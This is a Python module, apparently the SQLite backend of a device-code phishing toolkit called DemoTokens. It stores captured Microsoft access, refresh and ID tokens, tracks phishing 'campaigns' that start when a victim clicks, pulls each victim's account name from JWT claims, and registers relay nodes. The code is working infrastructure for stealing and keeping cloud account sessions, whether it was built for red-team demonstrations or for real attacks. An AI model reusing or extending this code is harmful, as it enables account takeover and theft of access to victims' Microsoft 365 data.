#!/usr/bin/env python3
"""
SQLite persistence layer for DemoTokens.

Tables
------
  tokens        — every captured access/refresh token
  device_codes  — operator-initiated device code campaigns
"""

import base64
import datetime
import json
import os
import sqlite3
import uuid

DB_PATH = os.environ.get("DB_PATH", "/data/demotokens.db")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _ensure():
    d = os.path.dirname(DB_PATH)
    if d:
        os.makedirs(d, exist_ok=True)


def _conn():
    _ensure()
    c = sqlite3.connect(DB_PATH, check_same_thread=False)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA journal_mode=WAL")
    return c


def init_db():
    _ensure()
    with _conn() as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS tokens (
                id            TEXT PRIMARY KEY,
                captured_at   TEXT NOT NULL,
                upn           TEXT NOT NULL,
                access_token  TEXT NOT NULL,
                refresh_token TEXT,
                id_token      TEXT,
                token_type    TEXT,
                expires_in    INTEGER,
                scope         TEXT,
                source        TEXT DEFAULT 'poll'
            );
            CREATE TABLE IF NOT EXISTS device_codes (
                id               TEXT PRIMARY KEY,
                created_at       TEXT NOT NULL,
                device_code      TEXT NOT NULL,
                user_code        TEXT NOT NULL,
                verification_url TEXT NOT NULL,
                expires_in       INTEGER,
                interval         INTEGER,
                status           TEXT DEFAULT 'pending',
                token_id         TEXT REFERENCES tokens(id),
                port             INTEGER DEFAULT NULL,
                domain           TEXT DEFAULT NULL
            );
            CREATE TABLE IF NOT EXISTS relay_nodes (
                id            TEXT PRIMARY KEY,
                label         TEXT,
                ip            TEXT,
                registered_at TEXT NOT NULL,
                last_seen     TEXT NOT NULL
            );
        """)
        # Migration for existing databases that predate the port column
        try:
            c.execute("ALTER TABLE device_codes ADD COLUMN port INTEGER DEFAULT NULL")
        except Exception:
            pass
        # Migration for existing databases that predate the domain column
        try:
            c.execute("ALTER TABLE device_codes ADD COLUMN domain TEXT DEFAULT NULL")
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Token helpers
# ---------------------------------------------------------------------------

def _upn_from_token(data):
    """Best-effort UPN extraction from JWT claims in id_token or access_token."""
    for key in ("id_token", "access_token"):
        tok = data.get(key, "")
        if not tok:
            continue
        try:
            parts = tok.split(".")
            if len(parts) < 2:
                continue
            pad    = parts[1] + "=" * (-len(parts[1]) % 4)
            claims = json.loads(base64.urlsafe_b64decode(pad))
            for claim in ("upn", "unique_name", "email", "preferred_username"):
                if claims.get(claim):
                    return claims[claim]
        except Exception:
            pass
    return "unknown"


def store_token(data, source="poll"):
    tid = str(uuid.uuid4())
    upn = _upn_from_token(data)
    now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    with _conn() as c:
        c.execute(
            "INSERT INTO tokens VALUES (?,?,?,?,?,?,?,?,?,?)",
            (
                tid, now, upn,
                data.get("access_token", ""),
                data.get("refresh_token"),
                data.get("id_token"),
                data.get("token_type"),
                data.get("expires_in"),
                data.get("scope"),
                source,
            ),
        )
    return {"id": tid, "upn": upn, "captured_at": now}


def get_token(tid):
    with _conn() as c:
        row = c.execute("SELECT * FROM tokens WHERE id=?", (tid,)).fetchone()
        return dict(row) if row else None


def list_tokens(limit=500):
    with _conn() as c:
        rows = c.execute(
            "SELECT * FROM tokens ORDER BY captured_at DESC LIMIT ?", (limit,)
        ).fetchall()
        return [dict(r) for r in rows]


def delete_token(tid):
    with _conn() as c:
        c.execute("DELETE FROM tokens WHERE id=?", (tid,))


def clear_tokens():
    with _conn() as c:
        c.execute("DELETE FROM tokens")


# ---------------------------------------------------------------------------
# Device code helpers
# ---------------------------------------------------------------------------

def store_device_code(dc):
    did = str(uuid.uuid4())
    now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    with _conn() as c:
        c.execute(
            "INSERT INTO device_codes "
            "(id, created_at, device_code, user_code, verification_url, "
            " expires_in, interval, status, token_id) "
            "VALUES (?,?,?,?,?,?,?,?,?)",
            (
                did, now,
                dc["device_code"],
                dc["user_code"],
                dc.get("verification_url", "https://microsoft.com/devicelogin"),
                dc.get("expires_in", 900),
                dc.get("interval", 5),
                "pending",
                None,
            ),
        )
    return did


def create_campaign_stub(port=None, domain=None):
    """Create a campaign placeholder; device code is fetched later when victim clicks."""
    did = str(uuid.uuid4())
    now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    domain = domain.strip() if domain and domain.strip() else None
    with _conn() as c:
        c.execute(
            "INSERT INTO device_codes "
            "(id, created_at, device_code, user_code, verification_url, "
            " expires_in, interval, status, token_id, port, domain) "
            "VALUES (?,?,?,?,?,?,?,?,?,?,?)",
            (did, now, "", "", "https://microsoft.com/devicelogin", 0, 5, "created", None, port, domain),
        )
    return did


def activate_campaign(dc_id, dc):
    """Populate a stub campaign with the MS device code response and mark pending."""
    with _conn() as c:
        c.execute(
            """UPDATE device_codes
               SET device_code=?, user_code=?, verification_url=?,
                   expires_in=?, interval=?, status='pending'
               WHERE id=?""",
            (
                dc["device_code"],
                dc.get("user_code", ""),
                dc.get("verification_url", "https://microsoft.com/devicelogin"),
                dc.get("expires_in", 900),
                dc.get("interval", 5),
                dc_id,
            ),
        )


def update_device_code_status(dc_id, status, token_id=None):
    with _conn() as c:
        if token_id:
            c.execute(
                "UPDATE device_codes SET status=?, token_id=? WHERE id=?",
                (status, token_id, dc_id),
            )
        else:
            c.execute(
                "UPDATE device_codes SET status=? WHERE id=?",
                (status, dc_id),
            )


def get_device_code(dc_id):
    with _conn() as c:
        row = c.execute("SELECT * FROM device_codes WHERE id=?", (dc_id,)).fetchone()
        return dict(row) if row else None


def list_device_codes(limit=200):
    with _conn() as c:
        rows = c.execute(
            """
            SELECT dc.*, t.upn AS victim_upn
            FROM   device_codes dc
            LEFT JOIN tokens t ON dc.token_id = t.id
            ORDER  BY dc.created_at DESC
            LIMIT  ?
            """,
            (limit,),
        ).fetchall()
        return [dict(r) for r in rows]


def delete_device_code(dc_id):
    with _conn() as c:
        c.execute("DELETE FROM device_codes WHERE id=?", (dc_id,))


def clear_device_codes():
    with _conn() as c:
        c.execute("DELETE FROM device_codes")


def counts():
    with _conn() as c:
        tokens     = c.execute("SELECT COUNT(*) FROM tokens").fetchone()[0]
        pending    = c.execute("SELECT COUNT(*) FROM device_codes WHERE status IN ('created','pending')").fetchone()[0]
        captured   = c.execute("SELECT COUNT(*) FROM device_codes WHERE status='captured'").fetchone()[0]
        return {"tokens": tokens, "pending": pending, "captured_campaigns": captured}


# ---------------------------------------------------------------------------
# Relay node helpers
# ---------------------------------------------------------------------------

def register_node(label, ip):
    """Insert a new relay node record; returns the generated node_id."""
    nid = str(uuid.uuid4())
    now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    with _conn() as c:
        c.execute(
            "INSERT INTO relay_nodes (id, label, ip, registered_at, last_seen) VALUES (?,?,?,?,?)",
            (nid, label or "", ip or "", now, now),
        )
    return nid


def touch_node(node_id, ip=None):
    """Update last_seen (and optionally ip) for an existing node."""
    now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    with _conn() as c:
        if ip:
            c.execute(
                "UPDATE relay_nodes SET last_seen=?, ip=? WHERE id=?",
                (now, ip, node_id),
            )
        else:
            c.execute("UPDATE relay_nodes SET last_seen=? WHERE id=?", (now, node_id))


def get_node(node_id):
    with _conn() as c:
        row = c.execute("SELECT * FROM relay_nodes WHERE id=?", (node_id,)).fetchone()
        return dict(row) if row else None


def list_nodes():
    with _conn() as c:
        rows = c.execute(
            "SELECT * FROM relay_nodes ORDER BY last_seen DESC"
        ).fetchall()
        return [dict(r) for r in rows]


def delete_node(node_id):
    with _conn() as c:
        c.execute("DELETE FROM relay_nodes WHERE id=?", (node_id,))
